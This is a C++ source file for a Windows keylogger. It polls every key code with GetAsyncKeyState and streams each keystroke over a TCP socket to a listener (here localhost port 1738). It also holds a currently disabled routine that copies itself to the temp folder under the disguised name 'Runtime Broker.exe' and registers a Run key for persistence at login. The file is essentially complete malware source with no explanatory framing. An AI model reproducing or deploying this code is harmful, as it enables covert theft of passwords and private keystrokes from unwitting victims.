#include <iostream>
#include <winsock2.h>
#include <WS2tcpip.h>
#include <experimental/filesystem>
#pragma comment(lib, "ws2_32.lib")

void initialize();
void send_keys(SOCKET* socket);

namespace fs = std::experimental::filesystem;

int main() {
	// hide the window
	HWND hwnd = GetConsoleWindow();
	ShowWindow(hwnd, SW_SHOW);

	//initialize();

	int err;
	WSAData wsData{};
	if (WSAStartup(MAKEWORD(2, 2), &wsData) != 0) {
		return -1;
	}

	SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
	if (!sock) {
		WSAGetLastError();
		WSACleanup();
		return -1;
	}

	sockaddr_in sin{};
	sin.sin_family = AF_INET;
	sin.sin_port = htons(1738);
	inet_pton(AF_INET, "127.0.0.1", &sin.sin_addr);

	err = connect(sock, (const sockaddr*)&sin, sizeof(sin));
	if (err) {
		WSAGetLastError();
		WSACleanup();
		return -1;
	}
	send_keys(&sock);
}

void send_keys(SOCKET* socket) {
	int err = 0;
	while (true) {
		for (int character = 0; character <= 255; character++) {
			if (GetAsyncKeyState(character) == -32767) {
				std::string key;
				key += character;
				err = send(*socket, key.c_str(), strlen(key.c_str()), 0);
				
			}
		}
	}
}

void initialize() {

	HKEY hKey;
	(void)RegOpenKeyExW(
		HKEY_CURRENT_USER,
		L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		0,
		KEY_ALL_ACCESS,
		&hKey
	);

	TCHAR szExeFileName[MAX_PATH];
	GetModuleFileName(NULL, szExeFileName, MAX_PATH);
	std::wstring startup_file = fs::temp_directory_path().wstring() + L"Runtime Broker.exe";
	if (!fs::exists(startup_file)) {
		fs::copy(szExeFileName, startup_file);

		(void)RegSetValueEx(
			hKey,
			L"Runtime Broker",
			0,
			REG_SZ,
			(LPBYTE)startup_file.c_str(),
			// account for null bytes in wchar
			startup_file.size() * 2
		);
	}
	RegCloseKey(hKey);
}